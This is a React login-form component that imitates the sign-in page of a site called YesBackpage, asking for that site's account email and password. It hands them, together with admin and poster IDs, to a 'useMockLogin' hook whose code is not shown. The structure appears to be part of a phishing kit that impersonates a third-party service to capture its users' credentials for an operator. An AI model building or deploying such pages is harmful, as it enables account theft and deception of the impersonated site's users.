"use client";
import { useState } from "react";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ adminId, posterId }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = {
      site,
      email,
      password,
    };
    login(submitValues);
    setEmail("");
    setPassword("");
  };

  return (
    <div className="flex flex-col h-screen items-center justify-center bg-gray-100">
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg p-8">
        <h2 className="text-2xl font-bold text-center text-gray-700 mb-6">
          Login to YesBackpage
        </h2>
        <form>
          <div className="mb-4">
            <label
              htmlFor="email"
              className="block text-sm font-medium text-gray-700"
            >
              YBP Account Email
            </label>
            <input
              type="email"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-blue-400"
              placeholder="Enter your email"
            />
          </div>
          <div className="mb-4">
            <label
              htmlFor="password"
              className="block text-sm font-medium text-gray-700"
            >
              YBP Account Password
            </label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-blue-400"
              placeholder="Enter your password"
            />
          </div>
          <div className="mb-6">
            <button
              onClick={handleSubmit}
              type="submit"
              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition duration-300"
            >
              Login
            </button>
          </div>
          <div className="text-center text-sm text-gray-500">
            Don’t have an account?{" "}
            <a href="#" className="text-blue-500 hover:underline">
              Sign up
            </a>
          </div>
        </form>
      </div>

      <div className="mt-[24px] flex gap-1 font-bold text-[16px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">My Account</p>
        {" | "}
        <p className=" cursor-pointer">Contact</p>
        {" | "}
        <p className=" cursor-pointer">Privacy</p>
        {" | "}
        <p className=" cursor-pointer"> Terms</p>
      </div>
    </div>
  );
}

export default LoginForm;
